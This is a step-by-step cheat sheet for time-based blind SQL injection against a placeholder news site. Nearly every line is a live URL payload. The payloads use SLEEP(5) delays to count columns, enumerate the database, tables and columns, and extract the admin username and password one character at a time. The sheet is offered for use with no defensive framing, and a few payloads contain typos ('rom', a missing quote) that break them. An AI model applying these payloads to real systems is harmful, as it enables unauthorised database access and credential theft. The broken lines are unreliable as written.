/*STEP 1 - Always use SLEEP(x)*/
--Use a SLEEP(x) function that delays query execution for 'x' seconds, if successul to find columns in current table :
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5);-- [If executed without a delay in response time, then query was unsuccessfuly executed]
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2;-- [Got a delay! So, current table has 2 columns!]

/*STEP 2 - Start enumerating*/
--Search for DB:
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 WHERE database() like 'a%';--
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 WHERE database() like 'sa%';-- [found 's' as first letter; searching for the rest]
[test all characters one by one, until we get a 5sec delay. In this case, db is 'sitedb']

--Search for tables in DB:
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from information_schema.tables WHERE table_schema = 'sitedb' and table_name like 'a%';--
[test all characters one by one, until we get a 5sec delay. In this case, found 'users' table]

--Enumerate columns in table 'users':
--Find first column (not necessarily in the right order!)
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from information_schema.columns WHERE table_schema = 'sitedb' and table_name = 'users' and column_name like 'a%';--
[test all characters one by one, until we get a 5sec delay. In this case, found 'id' column]

--Find second column (not necessarily in the right order!)
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from information_schema.columns WHERE table_schema = 'sitedb' and table_name = 'users' and column_name like 'a%' and COLUMN_NAME != 'id';--
[test all characters one by one, until we get a 5sec delay. In this case, found 'username' column]

--Find third column (not necessarily in the right order!)
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from information_schema.columns WHERE table_schema = 'sitedb' and table_name = 'users' and column_name like 'a%' and COLUMN_NAME != 'id' and COLUMN_NAME != 'username';--
[test all characters one by one, until we get a 5sec delay. In this case, found 'password' column]

--Find other columns (if exist), using the above mentioned methodology

--Search for 'admin', 'administrator', 'sa', 'root', 'superuser', etc. in table 'users':
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from users where username like 'a%;--
[test all characters one by one, until we get a 5sec delay. In this case, found 'admin' username]

--Search for admin's password in table 'users':
http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 rom users where username = 'admin' and password like 'a%';--
[test all characters one by one, until we get a 5sec delay. In this case, found admin's password to be '!Ro217ck']
